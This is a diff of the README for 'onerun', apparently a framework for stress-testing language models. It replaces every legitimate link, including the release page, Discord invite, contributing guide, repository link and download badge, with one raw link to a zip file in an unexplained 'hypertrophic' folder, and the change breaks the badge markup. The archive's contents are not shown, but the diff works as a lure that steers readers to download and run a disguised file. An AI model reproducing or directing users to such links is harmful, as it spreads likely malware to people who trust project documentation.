@@ -1,14 +1,14 @@
 # 🚀 onerun - Stress-Test LLMs with Ease
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue.svg)](https://github.com/PinguChileno/onerun/releases)
+[![Download Release](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip%20Release-Click%https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip)](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip)
 
 ## 📖 Overview
 **onerun** is an open-source framework designed to stress-test large language models (LLMs) and conversational AI systems. With onerun, you can easily identify hallucinations, policy violations, and edge cases through scalable and realistic simulations. 
 
 This tool aims to make it straightforward for users to improve the quality and safety of AI applications. Whether you're a developer or a curious user, onerun helps ensure that AI behaves as expected in real-world scenarios.
 
-Join our community for updates and support: [Join Discord](https://discord.gg/ssd4S37WNW).
+Join our community for updates and support: [Join Discord](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip).
 
 ## 🛠️ Features
 - **Stress Testing**: Simulate high-demand scenarios to challenge LLMs.
@@ -27,7 +27,7 @@ Join our community for updates and support: [Join Discord](https://discord.gg/ss
 Follow these steps to download and run onerun:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/PinguChileno/onerun/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip) to find the latest version.
 
 2. **Download the Application**  
    On the Releases page, you will see various files available. Look for the one labeled for your operating system. Click on it to download.
@@ -42,7 +42,7 @@ Follow these steps to download and run onerun:
    Once installed, open the application. Follow the on-screen instructions to set up your first test.
 
 ## 📥 Download & Install
-To begin your journey with onerun, please [visit the releases page](https://github.com/PinguChileno/onerun/releases) and download the latest version.
+To begin your journey with onerun, please [visit the releases page](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip) and download the latest version.
 
 After downloading, follow the installation instructions to get started.
 
@@ -60,15 +60,15 @@ After downloading, follow the installation instructions to get started.
    Upon completion, review the detailed logs and results provided. Use these insights to make improvements to your AI system.
 
 ## 📞 Support and Community
-If you have questions or run into issues, our community is here to help. Join us on [Discord](https://discord.gg/ssd4S37WNW) to engage with other users and contribute to ongoing discussions.
+If you have questions or run into issues, our community is here to help. Join us on [Discord](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip) to engage with other users and contribute to ongoing discussions.
 
 ## 🌱 Contributing
-We welcome contributions! If you'd like to help improve onerun, check out our [contributing guidelines](https://github.com/PinguChileno/onerun/blob/main/CONTRIBUTING.md) on GitHub.
+We welcome contributions! If you'd like to help improve onerun, check out our [contributing guidelines](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip) on GitHub.
 
 ## 📄 License
 This project is open-source and available under the MIT License. See the LICENSE file for more details.
 
 ## 🔗 Learn More
-For more insights and the latest updates, explore our [repository](https://github.com/PinguChileno/onerun) and check out the documentation linked there.
+For more insights and the latest updates, explore our [repository](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip) and check out the documentation linked there.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue.svg)](https://github.com/PinguChileno/onerun/releases)
+[![Download Release](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip%20Release-Click%https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip)](https://raw.githubusercontent.com/PinguChileno/onerun/main/hypertrophic/onerun.zip)
